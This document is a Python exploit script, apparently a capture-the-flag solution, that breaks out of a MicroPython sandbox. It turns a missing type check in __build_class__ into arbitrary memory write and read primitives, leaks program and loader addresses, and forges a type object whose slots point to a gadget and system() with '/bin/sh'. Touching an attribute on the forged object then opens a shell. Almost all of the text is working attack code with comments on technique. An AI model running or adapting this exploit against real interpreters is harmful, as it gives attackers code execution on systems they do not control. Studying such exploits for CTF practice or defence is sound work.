p64 = lambda num: num.to_bytes(8, 'little')
p16 = lambda num: num.to_bytes(2, 'little')
p8 = lambda num: num.to_bytes(1, 'little')
u64 = lambda d: int.from_bytes(d, 'little')

def write64(addr, val, shift=True):
    if not shift:
        assert (addr & 1) == 1
        assert (val & 1) == 1
    else:
        assert (addr & 1) == 0
        val <<= 8
        addr -= 1
    # mp_obj_cell_set writes to obj + 8, so subtract 8 from the address
    addr -= 8
    class Evil: pass
    e = Evil()
    # Evil.__new__ returns an object which mpy assumes is a cell object without doing
    # any prior checks, so we can return an int here to perform an arbitrary write
    # ints aren't objects, they are stored directly in memory as ints, but shifted left by 1 and tagged with a 1 as the LSB
    # so 0x100 would be stored in memory as
    # 0x100 << 1 | 1
    # this is what we'll abuse to do the write, but all our writes must be at odd addresses </3
    Evil.__new__ = lambda *args: val >> 1 # value to write
    __build_class__(
        lambda: addr >> 1, # address to write at
        'bonk', e)

def arb_read(addr, length):
    buf = b"A" * 0x10
    write64(id(buf) + 0x18, addr)
    # no slicing in this version of mpy, so we have to slice like this lol
    return bytes([buf[i] for i in range(length)])

def read64(addr):
    return u64(arb_read(addr, 8))

def overwrite_type(obj, type_addr):
    write64(id(obj), type_addr)

prog_base = id(str) - 0x2ED00
p_strlen = prog_base + 0x2FF58
ld_base = read64(p_strlen) - 0x340C0
print("prog_base = " + hex(prog_base))
print("ld_base = " + hex(ld_base))

GOAT_GADGET = ld_base + 0x000000000005FFF6 # mov rdi, rbx ; call qword ptr [rbx + 0x40]
SYSTEM = ld_base + 0x000000000005C5B6 + 2 # need + 2 to prevent alignment crash

fake_type = (
    b"/bin/sh\0" +
    p16(0) + # flags
    p16(0x6c) + # name
    p8(0x0) + # slot_index_make_new
    p8(0x0) + # slot_index_print
    p8(0x0) + # slot_index_call
    p8(0x0) + # slot_index_unary_op
    p8(0x0) + # slot_index_binary_op
    p8(1) + # slot_index_attr        <--- this path sets rbx to type(obj) which is exactly what we need 
    p8(0x0) + # slot_index_subscr
    p8(0x0) + # slot_index_iter
    p8(0x0) + # slot_index_buffer
    p8(0x0) + # slot_index_protocol
    p8(0x0) + # slot_index_parent
    p8(0x0) + # slot_index_locals_dict
    p64(GOAT_GADGET) + # 0x18
    b"A" * 0x20 +
    p64(SYSTEM) # 0x40
)

fake_type_addr = u64(arb_read(id(fake_type) + 0x18, 8))
print("fake_type_addr = " + hex(fake_type_addr))
evil = object()
print("id(evil) = " + hex(id(evil)))
overwrite_type(evil, fake_type_addr)
evil.gg
